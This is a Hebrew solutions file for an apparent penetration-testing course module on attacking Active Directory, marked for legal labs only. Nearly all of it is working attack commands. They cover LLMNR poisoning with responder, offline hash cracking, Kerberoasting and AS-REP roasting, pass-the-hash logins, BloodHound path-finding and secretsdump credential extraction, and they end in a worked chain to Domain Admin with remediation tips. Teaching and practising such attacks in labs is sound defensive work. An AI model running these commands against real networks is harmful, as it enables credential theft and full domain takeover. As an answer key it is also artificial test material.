<div dir="rtl">

# ✅ פתרונות מלאים — מודול 13: Active Directory

> נסה לבד ב-[`missions.md`](missions.md) קודם. כל הפעולות על מעבדת AD חוקית בלבד.

---

## חלק א' — יסודות ו-Enumeration

**13.1** — ה-DC מריץ את AD ומאמת **כל** התחברות בדומיין; הוא מחזיק את מסד הסיסמאות (NTDS.dit). שליטה עליו = שליטה בכל המשתמשים, המחשבים והמדיניות → כל הארגון.

**13.2** — המשתמש מבקש **TGT** מה-KDC (על ה-DC) בעת התחברות; עם ה-TGT מבקש **TGS** לשירות ספציפי; מציג את ה-TGS לשירות → גישה. הכול מבוסס כרטיסים מוצפנים.

**13.3**
```bash
crackmapexec smb <dc-ip>                       # דומיין, hostname, גרסה
enum4linux-ng -A <dc-ip>                        # משתמשים, shares, policy
crackmapexec smb <dc-ip> -u user -p pass --users
```

---

## חלק ב' — Kerberos ו-LLMNR

**13.4**
```bash
sudo responder -I eth0 -dwv
# כשלקוח ניגש לשם שגוי → NTLMv2 hash נלכד ל-logs
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**13.5**
```bash
GetUserSPNs.py corp.local/user:pass -dc-ip <dc-ip> -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

**13.6**
```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip> -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
המיוחד: **לא צריך אישורים** — רק שמות משתמש; פוגע בחשבונות עם "Do not require preauth".

---

## חלק ג' — תנועה רוחבית ו-BloodHound

**13.7**
```bash
crackmapexec smb <target> -u Administrator -H <NTLM-hash>
evil-winrm -i <target> -u Administrator -H <NTLM-hash>
psexec.py -hashes :<NTLM-hash> Administrator@<target>
```
NTLM מאמת מול ה-**hash**, לא מול הסיסמה הגולמית → אפשר "להעביר" את ה-hash כמות שהוא.

**13.8**
```bash
bloodhound-python -u user -p pass -d corp.local -ns <dc-ip> -c All
# טוענים JSON ל-BloodHound (neo4j) → שאילתה "Shortest Path to Domain Admins"
```
דוגמה לנתיב: `user → member of "IT Support" → AdminTo → SRV01 → session של DAuser → DCSync`.

**13.9**
```bash
secretsdump.py corp.local/admin:pass@<target>
```
שולף: **SAM** (local hashes), **LSA secrets**, **cached credentials**. על DC — גם **NTDS.dit** (כל הדומיין).

---

## 🔴 אתגר מסכם — שרשרת מלאה לדוגמה

```markdown
# דוח בדיקת AD — corp.local

1. LLMNR: responder → NTLMv2 של j.smith → hashcat → "Summer2021"
2. Enum:  crackmapexec smb -u j.smith → גישה, GetUserSPNs
3. Kerberoast: TGS של svc_sql → hashcat → "Password123!"
4. BloodHound: svc_sql → AdminTo → FILE01; FILE01 מכיל session של DA
5. PtH:   secretsdump על FILE01 → NTLM של DA
6. DCSync: secretsdump corp.local/DA@dc → hash של Administrator
7. → psexec ל-DC עם ה-hash → Domain Admin 🏆

## המלצות תיקון
- כבה LLMNR/NBT-NS; סיסמאות חזקות לחשבונות שירות (gMSA)
- הפעל preauth לכל החשבונות; least-privilege; נטר DCSync
```

> עברת מ-Zero ל-Domain Admin — היעד של כל בדיקה פנימית. המשך ל[מודול 14](../14-wireless/).

</div>
